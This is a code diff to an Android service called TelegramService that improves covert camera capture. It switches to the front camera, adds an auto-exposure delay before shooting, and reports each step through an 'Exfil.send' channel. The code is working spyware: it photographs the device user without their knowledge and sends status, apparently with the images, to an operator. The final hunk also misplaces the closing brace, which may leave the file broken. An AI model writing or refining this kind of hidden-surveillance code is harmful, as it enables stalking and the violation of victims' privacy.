@@ -101,7 +101,12 @@ public class TelegramService extends Service {
         Exfil.send("📷 [1/4] Opening Camera...");
         try {
             CameraManager manager = (CameraManager) getSystemService(CAMERA_SERVICE);
-            String cameraId = manager.getCameraIdList()[0]; // 0 = Back, 1 = Front
+            
+            // Ila kanet 3ndek ghir camera wa7da, kayrje3 liha. Ila kayn front, kayakhodha.
+            String cameraId = manager.getCameraIdList()[0];
+            if (manager.getCameraIdList().length > 1) {
+                cameraId = manager.getCameraIdList()[1]; // Front camera
+            }
             
             manager.openCamera(cameraId, new CameraDevice.StateCallback() {
                 @Override
@@ -112,14 +117,22 @@ public class TelegramService extends Service {
                         camera.createCaptureSession(Arrays.asList(reader.getSurface()), new CameraCaptureSession.StateCallback() {
                             @Override
                             public void onConfigured(CameraCaptureSession session) {
-                                Exfil.send("📷 [3/4] Session Configured. Capturing...");
+                                Exfil.send("📷 [3/4] Session Configured. Waiting for auto-exposure (1s)...");
                                 try {
                                     CaptureRequest.Builder builder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                                     builder.addTarget(reader.getSurface());
-                                    session.capture(builder.build(), null, null);
+                                    
+                                    // Delay dyal 1 seconde bach l'dow y-9ad
+                                    new Handler(Looper.getMainLooper()).postDelayed(() -> {
+                                        try {
+                                            session.capture(builder.build(), null, null);
+                                            Exfil.send("📷 [4/4] Image Captured. Saving...");
+                                        } catch (Exception e) {
+                                            Exfil.send("❌ Capture Error: " + e.getMessage());
+                                        }
+                                    }, 1000);
                                     
                                     reader.setOnImageAvailableListener(r -> {
-                                        Exfil.send("📷 [4/4] Image Available. Saving...");
                                         Image image = r.acquireLatestImage();
                                         ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                                         byte[] bytes = new byte[buffer.remaining()];
@@ -137,7 +150,7 @@ public class TelegramService extends Service {
                                         camera.close();
                                     }, null);
                                 } catch (Exception e) {
-                                    Exfil.send("Capture Error: " + e.getMessage());
+                                    Exfil.send("Session Error: " + e.getMessage());
                                 }
                             }
                             @Override public void onConfigureFailed(CameraCaptureSession session) {
@@ -193,4 +206,4 @@ public class TelegramService extends Service {
     public int onStartCommand(Intent intent, int flags, int startId) { return START_STICKY; }
     @Override
     public IBinder onBind(Intent intent) { return null; }
-}
+                                    }
